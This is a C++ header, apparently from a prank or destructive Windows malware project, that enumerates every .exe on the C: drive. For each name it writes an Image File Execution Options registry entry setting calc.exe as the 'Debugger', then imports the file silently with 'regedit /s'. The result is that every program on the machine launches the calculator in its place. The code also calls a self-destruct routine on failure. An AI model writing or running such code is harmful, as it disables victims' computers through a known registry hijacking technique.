// https://gist.github.com/FlyTechVideos/b969b23e42ee0252ada9ae1a1740c150

#include <vector>
#include <string>
#include <fstream>
#include <filesystem>

#include "_common.hpp"

using std::string;
using std::wstring;
using std::vector;

namespace hijack {
    static bool _inited = false;

    inline vector<std::filesystem::path> _find_files() {
        vector<std::filesystem::path> found = {};

        for (const auto& item : std::filesystem::recursive_directory_iterator("C:\\")) {
            if (!item.is_regular_file() || item.path().extension() != ".exe") {
                continue;
            }

            found.push_back(item.path());
        }

        return found;
    }

    inline void _init(wstring folder) {
        std::ofstream file(common::string(folder + L"\\redo.reg"));

        if (!file.is_open()) {
            common::self_destruct();
            return;
        }

        file << "Windows Registry Editor Version 5.00\n";

        vector<std::filesystem::path> files = hijack::_find_files();
        for (const auto& file_path : files) {
            string name = file_path.filename().string();

            file << "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"  << name << "]\n";
            file << "\"Debugger\"=\"calc.exe\"\n\n";
        }

        _inited = true;
    }

    inline void hijack(wstring folder) {
        if (!_inited) {
            _init(folder);
        }

        string cmd = "regedit /s " + common::string(folder) + "\\redo.reg";
        system(cmd.c_str());
    }
}
